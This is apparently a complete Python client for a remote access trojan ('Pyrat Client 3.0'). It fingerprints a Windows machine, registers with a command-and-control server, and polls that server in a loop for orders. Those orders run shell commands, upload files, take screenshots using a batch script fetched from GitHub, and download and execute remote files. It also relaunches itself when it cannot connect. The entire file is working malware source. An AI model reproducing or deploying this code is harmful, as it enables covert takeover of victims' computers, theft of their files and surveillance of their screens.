# -*- coding: utf-8 -*-

import os
import shutil
import socket
import platform
import requests
import subprocess
import tkinter as tk
from uuid import getnode
from tkinter import messagebox
from ast import literal_eval
from time import gmtime, strftime, sleep


HOME_HOST = "http://127.0.0.1:8000/pyrat3_server/api/"


def curr_datetime():
    return strftime('%Y-%m-%d %H:%M:%S', gmtime())


class Client:
    def __init__(self):
        # Code for detecting mac found on https://stackoverflow.com/questions/159137/getting-mac-address
        self.det_mac = ''.join(
            ('%012X' % getnode())[i : i + 2] for i in range(0, 12, 2)
        )
        self.det_os = platform.system() + platform.release()
        self.det_name = os.environ['COMPUTERNAME']
        self.det_int_ip = socket.gethostbyname(socket.gethostname())
        self.det_ext_ip = requests.get('https://api.ipify.org').text
        self.country = self._get_country()
        self.pc_uuid = subprocess.check_output(
            'wmic csproduct get UUID',
            shell=True,
            universal_newlines=True,
            stderr=subprocess.PIPE
        ).replace(' ', '').replace('\r', '').replace('\n', '').replace('UUID', '')
        self.user_data = {
            'pc_uuid': self.pc_uuid,
            'mac': self.det_mac,
            'os': self.det_os,
            'name': self.det_name,
            'int_ip': self.det_int_ip,
            'ext_ip': self.det_ext_ip,
            'country': self.country,
        }

        self.headers = requests.utils.default_headers().update(
            {
                'User-Agent': 'Pyrat Client 3.0',
            },
        )

        self.home_host = f'{HOME_HOST}{self.pc_uuid}/'
        self.home_host_files = f'{HOME_HOST}{self.pc_uuid}/upload'

    def _get_country(self):

        country = requests.get(f'http://ip-api.com/json/{self.det_ext_ip}?fields=status,message,countryCode').json()
        if country['status'] == 'success':
            return country['countryCode']
        else:
            return '??'

    def send_data(self, data, *args):

        # get system CP (default for PL: 852, and set variable here)

        if args and args[0]:
            say_catch_file = requests.post(
                self.home_host_files,
                data=data,
                headers=self.headers,
                files=args[0],
            )
            say_catch = requests.patch(
                self.home_host,
                json=data,
                headers=self.headers
            )
            return say_catch.json()
        else:
            say_catch = requests.patch(
                self.home_host,
                json=data,
                headers=self.headers
            )
            return say_catch.json()

    def get_data(self):

        say_give = requests.get(
            self.home_host,
            headers=self.headers,
        )
        return say_give.json()

    def register_at_db(self):

        get_status = requests.post(HOME_HOST, json=self.user_data)
        status_message = get_status.json()['message']
        status_code = get_status.status_code
        print(status_code, status_message)
        if status_code == 400:
            # Add raise
            print('Unable to register client!')
            exit()


class Command:

    @staticmethod
    def popup(title, text):
        r_window = tk.Tk()
        r_window.withdraw()
        r_window.after(30000, r_window.destroy)
        if messagebox.showinfo(text, title):
            r_window.destroy()
        confirmation = f'[SUCESS {curr_datetime()}] \nMessagebox showed'
        return {'confirmation': confirmation}

    @staticmethod
    def run_command(terminal, **kwargs):
        if kwargs:
            codepage_str = str(subprocess.check_output('chcp', shell=True, stderr=subprocess.PIPE))
            codepage = 'cp{}'.format(''.join([s for s in list(codepage_str) if s.isdigit()]))
            arg_list = []
            for key, value in kwargs.items():
                arg_list.append(value)
            if terminal:
                try:
                    output = subprocess.check_output(arg_list, shell=True, stderr=subprocess.PIPE).decode(codepage)
                    confirmation = f'[SUCCESS {curr_datetime()}] \n{output}'
                except subprocess.CalledProcessError:
                    confirmation = f'[FAILED {curr_datetime()}] unknown command'
            else:
                try:
                    output = subprocess.Popen(arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    confirmation = f'[SUCCESS {curr_datetime()}] \n{arg_list[0]} executed'
                except FileNotFoundError as e:
                    print(e)
                    confirmation = f'[FAILED {curr_datetime()}] executable file not found'
            return {'confirmation': confirmation}
        else:
            confirmation = f'[FAILED {curr_datetime()}]'
            return {'confirmation': confirmation}

    @staticmethod
    def file_upload(file_path):
        try:
            if os.path.isfile(file_path):
                file = {
                    'file': open(file_path, 'rb')
                }
                # say_file = s.post(home_host + '/upload/', files=file, data=payload)
                confirmation = f'[SUCCESS {curr_datetime()}] \nFile {file_path} uploaded'
                return {'confirmation': confirmation, 'file': file}
            else:
                confirmation = f'[ERROR {curr_datetime()}] \nFile {file_path} not exists'
                return {'confirmation': confirmation}
        except IOError:
            confirmation = f'[ERROR {curr_datetime()}] \nProblem with access to file {file_path}'
            return {'confirmation': confirmation}

    @staticmethod
    def screenshoot():
        temp_dir = os.path.expanduser('~') + '\\AppData\\Local\\Temp\\'
        bat_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
        # print(app_dir)
        r = requests.get(bat_url)
        with open(f'{temp_dir}screenCapture.bat', 'w') as f:
            f.write(r.text)
        screen_name = '%s.jpg' % (strftime('%Y-%m-%d_%H_%M_%S', gmtime()))
        # print(screen_name)
        args_dict = {
            'arg0': 'cd',
            'arg1': temp_dir,
            'arg2': '&&',
            'arg3': 'screenCapture.bat',
            'arg4': screen_name
        }
        make_screenshoot = Command.run_command(terminal=True, **args_dict)
        file = {
            'file': open(temp_dir + screen_name, 'rb')
        }
        confirmation = f'[SUCCESS {curr_datetime()}] Screeenshoot {screen_name}  was made & uploaded'
        if 'SUCCESS' in make_screenshoot['confirmation']:
            return {'confirmation': confirmation, 'file': file}
        else:
            confirmation = f'[ERROR {curr_datetime()}] Screeenshoot {screen_name}  was not made'
            return {'confirmation': confirmation}

    @staticmethod
    def file_download(url, d_path, execute):
        d_file_name = url.split('/')[-1]
        file = requests.get(url, stream=True)
        try:
            d_file_path = f'{d_path}\\{d_file_name}'
            with open(d_file_path, 'wb') as f:
                shutil.copyfileobj(file.raw, f)
            if execute:
                args_dict = {
                    'terminal': 0,
                    'args0': d_file_path,
                }
                text = Command.run_command(**args_dict)
                print(text)
                confirmation = f'[SUCESS {curr_datetime()}] File {url} downloaded, executed'
                return {'confirmation': confirmation}
            else:
                confirmation = f'[SUCESS {curr_datetime()}] File {url} downloaded, not executed'
                return {'confirmation': confirmation}
        except IOError as e:
            print(e)
            confirmation = f'[ERROR {curr_datetime()}] File {url} not downloaded'
            return {'confirmation': confirmation}


def main():

    client = Client()
    script_path = os.path.abspath(__file__)

    def connect_or_kill(try_count):

        messages = {
            "attempt": "CLIENT REGISTRATION: TRY TO CONNECT TO CC, ATTEMPT",
            "fail": "CLIENT REGISTRATION: UNABLE TO CONNECT, PAUSE FOR 10 SECONDS",
            "kill": "CLIENT REGISTRATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE",
        }

        max_count = try_count

        attempt = messages['attempt']
        fail = messages['fail']
        kill = messages['kill']

        while try_count:
            try:
                print(
                    f'++++ {attempt} {max_count-try_count+1} OF {max_count} ++++'
                )
                client.register_at_db()
                break
            except Exception: #as e:
                try_count -= 1
                if not try_count:
                    subprocess.Popen(["python", script_path])
                    print(f'++++ {kill} ++++')
                    raise SystemExit
                else:
                    print(f'++++ {fail} ++++')
                    #print(e)
                    sleep(5)

    connect_or_kill(4)
    command = Command()
    received_com_id = []
    sent_com_id = []

    com_dict = {
        'popup': command.popup,
        'run_command': command.run_command,
        'file_download': command.file_download,
        'screenshoot': command.screenshoot,
        'file_upload': command.file_upload,
    }

    iter_counter = 1

    while True:
        print('++++ NEW ITERATION, PRINTING LISTS ++++')
        print(f'Received commands (basing on command_id\'s): {received_com_id}')
        print(f'Sent commands (basing on command_id\'s): {sent_com_id}')
        # List of available commands
        # 'None' can flip whole script! (None as command params)
        get_job = client.get_data()
        com = get_job.get('last_command')
        com_args = literal_eval(get_job.get('last_command_args'))
        com_id = get_job['last_command_id']
        if any(i in com for i in com_dict):
            if com_id not in (received_com_id and sent_com_id):
                # Do something
                com_to_run = com_dict[com]
                if com_args:
                    com_result = com_to_run(**com_args)
                else:
                    com_result = com_to_run()
                received_com_id.append(com_id)
                job_results = {
                    'last_command_result': '[{}] {}'.format(com_id, com_result.get('confirmation')),
                }
                client.send_data(job_results, com_result.get('file', None))
                sent_com_id.append(com_id)
            else:
                job_results = {
                    'last_activity_datetime': strftime('%Y-%m-%d %H:%M:%S', gmtime()),
                }
                client.send_data(job_results)
        else:
            job_results = {
                'last_activity_datetime': strftime('%Y-%m-%d %H:%M:%S', gmtime()),
            }
            client.send_data(job_results)
        print(f'++++ END OF ITERATION #{iter_counter} ++++')
        iter_counter += 1
        sleep(5)


if __name__ == "__main__":
    main()
